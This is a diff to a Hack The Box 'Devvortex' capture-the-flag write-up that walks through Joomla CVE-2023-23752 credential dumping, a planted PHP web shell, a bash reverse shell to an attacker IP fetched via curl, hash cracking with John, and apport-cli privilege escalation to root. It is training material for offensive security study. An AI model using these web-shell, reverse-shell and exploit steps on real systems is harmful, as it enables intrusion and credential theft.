@@ -178,14 +178,28 @@ GENERATED WORDS: 4612
 ==> DIRECTORY: http://dev.devvortex.htb/tmp/  
 ```
 
-Further we find script in metasploit for getting Joomla version
+## 6. Further we find script in metasploit for getting Joomla version
+
+Run metasploit database
 
 ```
 sudo msfdb start
+```
+Run metasploit
+
+```
 sudo msfconsole
+```
+
+Search scripts for getting Joomla version
+```
 
 msf6 > search joomla
 
+```
+Use auxiliary and set parameters
+
+```
 msf6 > use auxiliary/scanner/http/joomla_version
 
 msf6 auxiliary(scanner/http/joomla_version) > show options
@@ -206,6 +220,11 @@ msf6 auxiliary(scanner/http/joomla_version) > set RHOSTS 10.10.11.242
 RHOSTS => 10.10.11.242
 msf6 auxiliary(scanner/http/joomla_version) > set VHOST dev.devvortex.htb
 VHOST => dev.devvortex.htb
+
+```
+Run script and getting version
+
+```
 msf6 auxiliary(scanner/http/joomla_version) > run
 
 [*] Server: nginx/1.18.0 (Ubuntu)
@@ -215,7 +234,7 @@ msf6 auxiliary(scanner/http/joomla_version) > run
 
 ```
 
-Find version Joomla CMS 4.2.6
+## 7. Find version Joomla CMS **4.2.6**
 
 Looking for public exploits for this version Joomla in google and find fresh vulnerability CVE-2023-23752. 
 We are also looking for an exploit and find this PoC https://github.com/adhikara13/CVE-2023-23752
@@ -223,3 +242,166 @@ We are also looking for an exploit and find this PoC https://github.com/adhikara
 
 # Initial access and exploitation 
 
+## 8. Read exploit docs and run this script
+
+```
+
+└─$ python3 CVE-2023-23752.py -u dev.devvortex.htb -o dump.txt
+[+] => Vulnerable dev.devvortex.htb
+User: lewis Password: P4ntherg0t1n5r3c0n## Database: joomla
+File Saved => dump.txt
+
+```
+
+This vulnerability allows you to dump the Joomla administrator password and save in dump.txt file.
+
+## 9. Go to administration panel and sign in
+
+![plot](./4.png)
+
+And we went to the admin panel
+
+Next, we need to somehow upload the web shell, namely a PHP file since Joomla is written in PHP.
+
+Search in google exploitation technique for upload web shell in Joomla and find templates method.
+Go to System => Sites Templates =>  Cassiopeia Details and Files
+and click New File
+
+![plot](./5.png)
+
+## 10. Create new php file and write simple php web-shell
+
+```php
+<?php system($_GET["cmd"]); ?>
+```
+
+![plot](./6.png)
+
+And later click Save and close
+
+![plot](./7.png)
+
+Go to url for our payload ave.php and check command execution.
+We have a webshell access but we need full shell access
+
+## 11. Run reverse shell with reverse(stager) run method.
+
+Create directory www and create a file with this content
+
+```bash
+
+bash -i >& /dev/tcp/10.10.14.187/9001 0>&1
+
+```
+**Don't forget to change it to yours ip for HTB vpn**
+
+```
+
+Execute this directory this command for run simple http server
+
+└─$ python3 -m http.server                                    
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+
+```
+This is necessary to download the shell script with our reverse shell payload.
+
+## 12. Run reverse shell
+
+Let's intercept the web shell command with a burp and enter a command there to download and launch our reverse shell
+through the curl command with redirecting the output to standard input in the bash interpreter
+
+![plot](./8.png)
+
+```
+
+└─$ python3 -m http.server                                    
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.11.242 - - [07/Dec/2023 16:13:12] "GET /shell.sh HTTP/1.1" 200 -
+
+```
+Our stager download to system and execute with bash and we have a shell
+
+
+![plot](./9.png)
+
+# Postexploitation and Privilage escalation
+
+## 13. Check interesting files
+
+Go to path joomla database config and finded creds for database
+
+![plot](./10.png)
+
+## 14. Connect to mysql
+
+Connect to mysql and show databases
+
+```sql
+mysql> show databases;
+mysql> use joomla;
+mysql> show tables;
+mysql> select username,password from sd4fg_users;
++----------+--------------------------------------------------------------+
+| username | password                                                     |
++----------+--------------------------------------------------------------+
+| lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
+| logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |
++----------+--------------------------------------------------------------+
+2 rows in set (0.00 sec)
+
+```
+We have 2 hashes our use lewis and unknown user logan.
+
+Copy he hash and save to file john.hash for John the Ripper brutforce attack
+
+## 15. Brutforcing hash with john
+
+```
+
+john --wordlist=/usr/share/wordlists/rockyou.txt john.hash 
+
+```
+![plot](./11.png)
+
+We have a password for user logan
+
+## 16. Connect with ssh or su
+
+Connect to server with ssh as user logan
+
+Show sudo permissions execute command
+
+```bash
+logan@devvortex:~$ sudo -l
+Matching Defaults entries for logan on devvortex:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User logan may run the following commands on devvortex:
+    (ALL : ALL) /usr/bin/apport-cli
+```
+
+And see full sudo permisson for unknown utilities apport-cli.
+
+Search information how privilage escalation with this utilities and find this method.
+
+see this utility and find CVE for local privilage escalation
+
+https://github.com/diego-tella/CVE-2023-1326-PoC
+
+with command 
+
+```bash
+sudo apport-cli -p ssh -f rep.crash --save rep.crash /usr/sbin/sshd
+```
+
+create another some crash file and run command of exploit
+
+```bash
+sudo /usr/bin/apport-cli -c /tmp/rep.crash
+press V (view report)
+!/bin/bash
+```
+
+![plot](./12.png)
+
+And we have a root shell!
